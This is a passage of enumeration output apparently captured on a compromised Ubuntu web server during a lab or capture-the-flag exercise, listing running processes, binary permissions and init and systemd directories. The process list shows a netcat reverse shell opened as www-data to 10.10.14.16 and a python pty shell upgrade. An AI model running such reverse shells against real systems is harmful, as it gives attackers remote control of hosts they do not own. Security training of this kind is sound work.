root        56  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
root        57  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_0]
root        58  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_0]
root        59  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_1]
root        60  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_1]
root        65  0.0  0.0      0     0 ?        S<   Jun18   0:00 [ipv6_addrconf]
root        78  0.0  0.0      0     0 ?        S<   Jun18   0:00 [deferwq]
root        79  0.0  0.0      0     0 ?        S<   Jun18   0:00 [charger_manager]
root       143  0.0  0.0      0     0 ?        S<   Jun18   0:00 [kpsmoused]
root       144  0.0  0.0      0     0 ?        S<   Jun18   0:00 [ttm_swap]
root       173  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_2]
root       174  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_2]
root       175  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_3]
root       176  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_3]
root       177  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_4]
root       178  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_4]
root       179  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_5]
root       180  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_5]
root       181  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_6]
root       182  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_6]
root       183  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_7]
root       184  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_7]
root       185  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_8]
root       186  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_8]
root       187  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_9]
root       188  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_9]
root       189  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_10]
root       190  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_10]
root       191  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_11]
root       192  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_11]
root       193  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_12]
root       194  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_12]
root       195  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_13]
root       196  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_13]
root       197  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_14]
root       198  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_14]
root       199  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_15]
root       200  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_15]
root       201  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_16]
root       202  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_16]
root       203  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_17]
root       204  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_17]
root       205  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_18]
root       206  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_18]
root       207  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_19]
root       208  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_19]
root       209  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_20]
root       210  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_20]
root       211  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_21]
root       212  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_21]
root       213  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_22]
root       214  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_22]
root       215  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_23]
root       216  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_23]
root       217  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_24]
root       218  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_24]
root       219  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_25]
root       220  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_25]
root       221  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_26]
root       222  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_26]
root       223  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_27]
root       224  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_27]
root       225  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_28]
root       226  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_28]
root       227  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_29]
root       228  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_29]
root       229  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_30]
root       230  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_30]
root       231  0.0  0.0      0     0 ?        S    Jun18   0:00 [scsi_eh_31]
root       232  0.0  0.0      0     0 ?        S<   Jun18   0:00 [scsi_tmf_31]
root       262  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
root       264  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
root       269  0.0  0.0      0     0 ?        S<   Jun18   0:01 [kworker/0:1H]
root       337  0.0  0.0      0     0 ?        S<   Jun18   0:00 [raid5wq]
root       369  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
root       397  0.0  0.0      0     0 ?        S    Jun18   0:01 [jbd2/sda1-8]
root       398  0.0  0.0      0     0 ?        S<   Jun18   0:00 [ext4-rsv-conver]
root       462  0.0  0.3  28352  3224 ?        Ss   Jun18   0:02 /lib/systemd/systemd-journald
root       473  0.0  0.0      0     0 ?        S    Jun18   0:00 [kauditd]
root       485  0.0  0.0      0     0 ?        S<   Jun18   0:00 [iscsi_eh]
root       489  0.0  0.0      0     0 ?        S<   Jun18   0:00 [ib_addr]
root       490  0.0  0.1  94772  1512 ?        Ss   Jun18   0:00 /sbin/lvmetad -f
root       498  0.0  0.0      0     0 ?        S<   Jun18   0:00 [ib_mcast]
root       500  0.0  0.4  44716  4228 ?        Ss   Jun18   0:00 /lib/systemd/systemd-udevd
root       502  0.0  0.0      0     0 ?        S<   Jun18   0:00 [ib_nl_sa_wq]
root       504  0.0  0.0      0     0 ?        S<   Jun18   0:00 [ib_cm]
root       505  0.0  0.0      0     0 ?        S<   Jun18   0:00 [iw_cm_wq]
root       506  0.0  0.0      0     0 ?        S<   Jun18   0:00 [rdma_cm]
systemd+   623  0.0  0.2 100324  2568 ?        Ssl  Jun18   0:19 /lib/systemd/systemd-timesyncd
root       850  0.0  0.0   5220   148 ?        Ss   Jun18   0:13 /sbin/iscsid
root       851  0.0  0.3   5720  3512 ?        S<Ls Jun18   1:26 /sbin/iscsid
root      1028  0.0  0.6 275768  6196 ?        Ssl  Jun18   0:09 /usr/lib/accountsservice/accounts-daemon
message+  1031  0.0  0.3  42892  3832 ?        Ss   Jun18   0:11 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root      1047  0.0  0.2  29008  3016 ?        Ss   Jun18   0:01 /usr/sbin/cron -f
daemon    1048  0.0  0.2  26044  2172 ?        Ss   Jun18   0:00 /usr/sbin/atd -f
root      1058  0.0  0.3  28676  3196 ?        Ss   Jun18   0:05 /lib/systemd/systemd-logind
syslog    1069  0.0  0.5 256392  5324 ?        Ssl  Jun18   0:00 /usr/sbin/rsyslogd -n
root      1086  0.0  0.5  65508  6032 ?        Ss   Jun18   0:00 /usr/sbin/sshd -D
root      1088  0.0  0.1   4396  1268 ?        Ss   Jun18   0:00 /usr/sbin/acpid
root      1092  0.0  0.7 636772  7284 ?        Ssl  Jun18   0:02 /usr/bin/lxcfs /var/lib/lxcfs/
root      1106  0.0  1.1 187244 11556 ?        Ssl  Jun18   7:23 /usr/bin/vmtoolsd
root      1115  0.0  2.1 345940 22296 ?        Ssl  Jun18   0:16 /usr/lib/snapd/snapd
root      1167  0.0  0.5 277176  5996 ?        Ssl  Jun18   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1184  0.0  0.3  65832  3392 tty1     Ss   Jun18   0:00 /bin/login -f
root      1194  0.0  0.0  13372   160 ?        Ss   Jun18   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
mysql     1196  0.0 16.3 1109156 165804 ?      Ssl  Jun18   3:02 /usr/sbin/mysqld
root      1223  0.0  2.4 221548 25228 ?        Ss   Jun18   0:31 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
www-data  1232  0.0  0.6 221548  6488 ?        S    Jun18   0:00 php-fpm: pool www
www-data  1233  0.0  0.6 221548  6488 ?        S    Jun18   0:00 php-fpm: pool www
root      1234  0.0  2.6 258332 26748 ?        Ss   Jun18   0:24 /usr/sbin/apache2 -k start
yossi     1384  0.0  0.4  45276  4756 ?        Ss   Jun18   0:00 /lib/systemd/systemd --user
yossi     1386  0.0  0.2  61508  2192 ?        S    Jun18   0:00 (sd-pam)
yossi     1392  0.0  0.5  22604  5128 tty1     S+   Jun18   0:00 -bash
root      2319  0.0  0.0      0     0 ?        S    Jun24   0:05 [kworker/u2:1]
root      2721  0.0  0.0      0     0 ?        S    Jun24   0:04 [kworker/u2:0]
root      3519  0.0  0.0      0     0 ?        S    Jun24   0:00 [kworker/0:0]
www-data  4183  0.0  1.3 259048 13532 ?        S    Jun24   0:03 /usr/sbin/apache2 -k start
www-data  4184  0.0  1.3 259048 13380 ?        S    Jun24   0:03 /usr/sbin/apache2 -k start
www-data  4185  0.0  1.4 259276 14448 ?        S    Jun24   0:03 /usr/sbin/apache2 -k start
www-data  4186  0.0  1.3 259048 13564 ?        S    Jun24   0:03 /usr/sbin/apache2 -k start
www-data  4192  0.0  1.3 259048 13572 ?        S    Jun24   0:03 /usr/sbin/apache2 -k start
www-data  4195  0.0  1.4 259268 14440 ?        S    Jun24   0:03 /usr/sbin/apache2 -k start
www-data  4197  0.0  1.4 259268 14440 ?        S    Jun24   0:03 /usr/sbin/apache2 -k start
www-data  4203  0.0  1.4 259280 14448 ?        S    Jun24   0:03 /usr/sbin/apache2 -k start
www-data  4209  0.0  1.3 259040 13548 ?        S    Jun24   0:03 /usr/sbin/apache2 -k start
www-data  4212  0.0  1.3 259040 13888 ?        S    Jun24   0:03 /usr/sbin/apache2 -k start
www-data  4511  0.0  0.0   4504   704 ?        S    01:38   0:00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 8001 >/tmp/f
www-data  4514  0.0  0.0   4532   684 ?        S    01:38   0:00 cat /tmp/f
www-data  4515  0.0  0.0   4504   784 ?        S    01:38   0:00 /bin/sh -i
www-data  4516  0.0  0.1  11300  1800 ?        S    01:38   0:00 nc 10.10.14.16 8001
www-data  4572  0.0  0.8  35840  8532 ?        S    01:42   0:00 python3 -c import pty; pty.spawn("/bin/bash")
www-data  4573  0.0  0.3  18212  3340 pts/0    Ss   01:42   0:00 /bin/bash
www-data  4584  0.0  0.3  10552  3412 pts/0    S+   01:45   0:00 bash
www-data  4585  0.0  0.3  10608  3400 pts/0    S+   01:45   0:00 bash
www-data  4586  0.0  0.0   4380   748 pts/0    S+   01:45   0:00 tee -a
www-data  4773  0.0  0.2  10592  2900 pts/0    S+   01:46   0:00 bash
www-data  4774  0.0  0.2  34424  2932 pts/0    R+   01:46   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
1016K -rwxr-xr-x 1 root root 1014K May 16  2017 /bin/bash
  48K -rwxr-xr-x 1 root root   47K May 17  2017 /bin/login
    0 lrwxrwxrwx 1 root root     4 Nov 27  2017 /bin/sh -> dash
 1.6M -rwxr-xr-x 1 root root  1.6M Oct 27  2017 /lib/systemd/systemd
 320K -rwxr-xr-x 1 root root  319K Oct 27  2017 /lib/systemd/systemd-journald
 608K -rwxr-xr-x 1 root root  605K Oct 27  2017 /lib/systemd/systemd-logind
 140K -rwxr-xr-x 1 root root  139K Oct 27  2017 /lib/systemd/systemd-timesyncd
 444K -rwxr-xr-x 1 root root  443K Oct 27  2017 /lib/systemd/systemd-udevd
    0 lrwxrwxrwx 1 root root    20 Oct 27  2017 /sbin/init -> /lib/systemd/systemd
 768K -rwxr-xr-x 1 root root  766K Jul 26  2017 /sbin/iscsid
  52K -rwxr-xr-x 1 root root   51K Apr 16  2016 /sbin/lvmetad
 504K -rwxr-xr-x 1 root root  502K Nov  8  2017 /sbin/mdadm
 220K -rwxr-xr-x 1 root root  219K Jan 12  2017 /usr/bin/dbus-daemon
  20K -rwxr-xr-x 1 root root   19K Nov  9  2017 /usr/bin/lxcfs
  44K -rwxr-xr-x 1 root root   44K Feb  9  2017 /usr/bin/vmtoolsd
 164K -rwxr-xr-x 1 root root  162K Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
  16K -rwxr-xr-x 1 root root   15K Jan 18  2016 /usr/lib/policykit-1/polkitd
  21M -rwxr-xr-x 1 root root   21M Nov 30  2017 /usr/lib/snapd/snapd
  48K -rwxr-xr-x 1 root root   47K Apr  9  2016 /usr/sbin/acpid
 648K -rwxr-xr-x 1 root root  647K Sep 18  2017 /usr/sbin/apache2
  28K -rwxr-xr-x 1 root root   27K Jan 15  2016 /usr/sbin/atd
  44K -rwxr-xr-x 1 root root   44K Apr  6  2016 /usr/sbin/cron
  24M -rwxr-xr-x 1 root root   24M Jan 19 20:56 /usr/sbin/mysqld
 588K -rwxr-xr-x 1 root root  586K Apr  5  2016 /usr/sbin/rsyslogd
 776K -rwxr-xr-x 1 root root  773K Jan 18 16:16 /usr/sbin/sshd


[-] /etc/init.d/ binary permissions:
total 340
drwxr-xr-x  2 root root 4096 Feb  5 17:19 .
drwxr-xr-x 96 root root 4096 May  1 20:12 ..
-rw-r--r--  1 root root 1264 Feb  5 17:19 .depend.boot
-rw-r--r--  1 root root 1252 Feb  5 17:19 .depend.start
-rw-r--r--  1 root root 1341 Feb  5 17:19 .depend.stop
-rw-r--r--  1 root root 2427 Jan 19  2016 README
-rwxr-xr-x  1 root root 2243 Feb 10  2016 acpid
-rwxr-xr-x  1 root root 2210 Apr  6  2016 apache-htcacheclean
-rwxr-xr-x  1 root root 8087 Apr  6  2016 apache2
-rwxr-xr-x  1 root root 6223 Mar  4  2017 apparmor
-rwxr-xr-x  1 root root 2802 Nov 17  2017 apport
-rwxr-xr-x  1 root root 1071 Dec  6  2015 atd
-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x  1 root root 3049 Apr  6  2016 cron
-rwxr-xr-x  1 root root  937 Mar 28  2015 cryptdisks
-rwxr-xr-x  1 root root  896 Mar 28  2015 cryptdisks-early
-rwxr-xr-x  1 root root 2813 Dec  2  2015 dbus
-rwxr-xr-x  1 root root 1105 Mar 15  2016 grub-common
-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x  1 root root 1503 Mar 29  2016 iscsid
-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x  1 root root 2087 Dec 21  2015 kmod
-rwxr-xr-x  1 root root  695 Oct 30  2015 lvm2
-rwxr-xr-x  1 root root  571 Oct 30  2015 lvm2-lvmetad
-rwxr-xr-x  1 root root  586 Oct 30  2015 lvm2-lvmpolld
-rwxr-xr-x  1 root root 2378 Nov  9  2017 lxcfs
-rwxr-xr-x  1 root root 2541 Jun  8  2017 lxd
-rwxr-xr-x  1 root root 2365 Oct  9  2017 mdadm
-rwxr-xr-x  1 root root 1199 Jul 16  2014 mdadm-waitidle
-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x  1 root root 5607 Feb  3  2017 mysql
-rwxr-xr-x  1 root root 4771 Jul 20  2015 networking
-rwxr-xr-x  1 root root 1581 Oct 16  2015 ondemand
-rwxr-xr-x  1 root root 2503 Mar 29  2016 open-iscsi
-rwxr-xr-x  1 root root 1578 Sep 18  2016 open-vm-tools
-rwxr-xr-x  1 root root 4987 Aug  9  2017 php7.0-fpm
-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x  1 root root 1490 May  7  2015 postgresql
-rwxr-xr-x  1 root root 1192 Sep  6  2015 procps
-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x  1 root root 1226 Jun  9  2015 screen-cleanup
-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 4077 Mar 16  2017 ssh
-rwxr-xr-x  1 root root 1597 Jan 28  2016 sysstat
-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x  1 root root 1391 Apr 20  2017 unattended-upgrades
-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x  1 root root 1306 Jun 15  2017 uuidd


[-] /etc/init/ config file permissions:
total 160
drwxr-xr-x  2 root root 4096 Feb  5 17:19 .
drwxr-xr-x 96 root root 4096 May  1 20:12 ..
-rw-r--r--  1 root root  338 Apr  9  2016 acpid.conf
-rw-r--r--  1 root root 3709 Mar  4  2017 apparmor.conf
-rw-r--r--  1 root root 1629 Nov 17  2017 apport.conf
-rw-r--r--  1 root root  250 Apr  4  2016 console-font.conf
-rw-r--r--  1 root root  509 Apr  4  2016 console-setup.conf
-rw-r--r--  1 root root  297 Apr  6  2016 cron.conf
-rw-r--r--  1 root root  412 Mar 28  2015 cryptdisks-udev.conf
-rw-r--r--  1 root root 1519 Mar 28  2015 cryptdisks.conf
-rw-r--r--  1 root root  482 Sep  1  2015 dbus.conf
-rw-r--r--  1 root root 1247 Jun  1  2015 friendly-recovery.conf
-rw-r--r--  1 root root  284 Jul 23  2013 hostname.conf
-rw-r--r--  1 root root  300 May 21  2014 hostname.sh.conf
-rw-r--r--  1 root root  561 Mar 14  2016 hwclock-save.conf
-rw-r--r--  1 root root  674 Mar 14  2016 hwclock.conf
-rw-r--r--  1 root root  109 Mar 14  2016 hwclock.sh.conf
-rw-r--r--  1 root root  597 Apr 11  2016 irqbalance.conf
-rw-r--r--  1 root root  689 Aug 20  2015 kmod.conf
-rw-r--r--  1 root root  540 Jul  6  2017 lxcfs.conf
-rw-r--r--  1 root root  813 Jun  8  2017 lxd.conf
-rw-r--r--  1 root root 1757 Feb  3  2017 mysql.conf
-rw-r--r--  1 root root  530 Jun  2  2015 network-interface-container.conf
-rw-r--r--  1 root root 1756 Jun  2  2015 network-interface-security.conf
-rw-r--r--  1 root root  933 Jun  2  2015 network-interface.conf
-rw-r--r--  1 root root 2493 Jun  2  2015 networking.conf
-rw-r--r--  1 root root  568 Feb  1  2016 passwd.conf
-rw-r--r--  1 root root  398 Aug  9  2017 php7.0-fpm.conf
-rw-r--r--  1 root root  363 Jun  5  2014 procps-instance.conf
-rw-r--r--  1 root root  119 Jun  5  2014 procps.conf
-rw-r--r--  1 root root  457 Jun  3  2015 resolvconf.conf
-rw-r--r--  1 root root  426 Dec  2  2015 rsyslog.conf
-rw-r--r--  1 root root  230 Apr  4  2016 setvtrgb.conf
-rw-r--r--  1 root root  641 Mar 16  2017 ssh.conf
-rw-r--r--  1 root root  337 Apr 12  2016 udev.conf
-rw-r--r--  1 root root  360 Apr 12  2016 udevmonitor.conf
-rw-r--r--  1 root root  352 Apr 12  2016 udevtrigger.conf
-rw-r--r--  1 root root  473 Aug  7  2014 ufw.conf
-rw-r--r--  1 root root  683 Feb 24  2015 ureadahead-other.conf
-rw-r--r--  1 root root  889 Feb 24  2015 ureadahead.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 8.3M
drwxr-xr-x 27 root root  36K Feb  5 17:18 system
drwxr-xr-x  2 root root 4.0K Jan 11 19:40 system-shutdown
drwxr-xr-x  2 root root 4.0K Jan 11 19:40 network
drwxr-xr-x  2 root root 4.0K Jan 11 19:40 system-generators
drwxr-xr-x  2 root root 4.0K Jan 11 19:40 system-preset
drwxr-xr-x  2 root root 4.0K Nov 27  2017 system-sleep
-rwxr-xr-x  1 root root 443K Oct 27  2017 systemd-udevd
-rwxr-xr-x  1 root root  55K Oct 27  2017 systemd-activate
-rwxr-xr-x  1 root root 103K Oct 27  2017 systemd-bootchart
-rwxr-xr-x  1 root root 268K Oct 27  2017 systemd-cgroups-agent
-rwxr-xr-x  1 root root 276K Oct 27  2017 systemd-initctl
-rwxr-xr-x  1 root root 340K Oct 27  2017 systemd-localed
-rwxr-xr-x  1 root root 123K Oct 27  2017 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  35K Oct 27  2017 systemd-quotacheck
-rwxr-xr-x  1 root root 653K Oct 27  2017 systemd-resolved
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-rfkill
-rwxr-xr-x  1 root root 143K Oct 27  2017 systemd-shutdown
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-socket-proxyd
-rwxr-xr-x  1 root root  51K Oct 27  2017 systemd-sysctl
-rwxr-xr-x  1 root root  35K Oct 27  2017 systemd-user-sessions
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-backlight
-rwxr-xr-x  1 root root  47K Oct 27  2017 systemd-binfmt
-rwxr-xr-x  1 root root 301K Oct 27  2017 systemd-fsck
-rwxr-xr-x  1 root root  75K Oct 27  2017 systemd-fsckd
-rwxr-xr-x  1 root root 605K Oct 27  2017 systemd-logind
-rwxr-xr-x  1 root root  51K Oct 27  2017 systemd-modules-load
-rwxr-xr-x  1 root root  35K Oct 27  2017 systemd-random-seed
-rwxr-xr-x  1 root root  51K Oct 27  2017 systemd-remount-fs
-rwxr-xr-x  1 root root  31K Oct 27  2017 systemd-reply-password
-rwxr-xr-x  1 root root  71K Oct 27  2017 systemd-sleep
-rwxr-xr-x  1 root root 333K Oct 27  2017 systemd-timedated
-rwxr-xr-x  1 root root 139K Oct 27  2017 systemd-timesyncd
-rwxr-xr-x  1 root root 276K Oct 27  2017 systemd-update-utmp
-rwxr-xr-x  1 root root 1.6M Oct 27  2017 systemd
-rwxr-xr-x  1 root root  15K Oct 27  2017 systemd-ac-power
-rwxr-xr-x  1 root root 352K Oct 27  2017 systemd-bus-proxyd
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-cryptsetup
-rwxr-xr-x  1 root root  31K Oct 27  2017 systemd-hibernate-resume
-rwxr-xr-x  1 root root 332K Oct 27  2017 systemd-hostnamed
-rwxr-xr-x  1 root root 319K Oct 27  2017 systemd-journald
-rwxr-xr-x  1 root root 828K Oct 27  2017 systemd-networkd
-rwxr-xr-x  1 root root 1.3K Oct 27  2017 systemd-sysv-install

/lib/systemd/system:
total 960K
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 halt.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 getty.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 resolvconf.service.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 sigpwr.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 timers.target.wants
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 systemd-resolved.service.d
drwxr-xr-x 2 root root 4.0K Jan 11 19:40 systemd-timesyncd.service.d
-rw-r--r-- 1 root root  246 Jan  2 23:06 apport-forward.socket
-rw-r--r-- 1 root root  683 Dec  7  2017 lxd.service
-rw-r--r-- 1 root root  206 Dec  7  2017 lxd-bridge.service
-rw-r--r-- 1 root root  318 Dec  7  2017 lxd-containers.service
-rw-r--r-- 1 root root  197 Dec  7  2017 lxd.socket
-rw-r--r-- 1 root root  252 Nov 30  2017 snapd.autoimport.service
-rw-r--r-- 1 root root  386 Nov 30  2017 snapd.core-fixup.service
-rw-r--r-- 1 root root  290 Nov 30  2017 snapd.refresh.service
-rw-r--r-- 1 root root  323 Nov 30  2017 snapd.refresh.timer
-rw-r--r-- 1 root root  308 Nov 30  2017 snapd.service
-rw-r--r-- 1 root root  253 Nov 30  2017 snapd.snap-repair.service
-rw-r--r-- 1 root root  281 Nov 30  2017 snapd.snap-repair.timer
-rw-r--r-- 1 root root  281 Nov 30  2017 snapd.socket
-rw-r--r-- 1 root root  474 Nov 30  2017 snapd.system-shutdown.service
drwxr-xr-x 2 root root 4.0K Nov 27  2017 apache2.service.d
lrwxrwxrwx 1 root root    9 Nov 27  2017 screen-cleanup.service -> /dev/null
-rw-r--r-- 1 root root  311 Nov  9  2017 lxcfs.service
-rw-r--r-- 1 root root  337 Nov  8  2017 postgresql.service
-rw-r--r-- 1 root root 1.4K Nov  8  2017 postgresql@.service
-rw-r--r-- 1 root root  670 Nov  8  2017 mdadm-shutdown.service
lrwxrwxrwx 1 root root   21 Oct 27  2017 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root   14 Oct 27  2017 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 checkroot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Oct 27  2017 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Oct 27  2017 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Oct 27  2017 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Oct 27  2017 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 Oct 27  2017 dbus-org.freedesktop.network1.service -> systemd-networkd.service
lrwxrwxrwx 1 root root   24 Oct 27  2017 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
lrwxrwxrwx 1 root root   25 Oct 27  2017 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
lrwxrwxrwx 1 root root   16 Oct 27  2017 default.target -> graphical.target
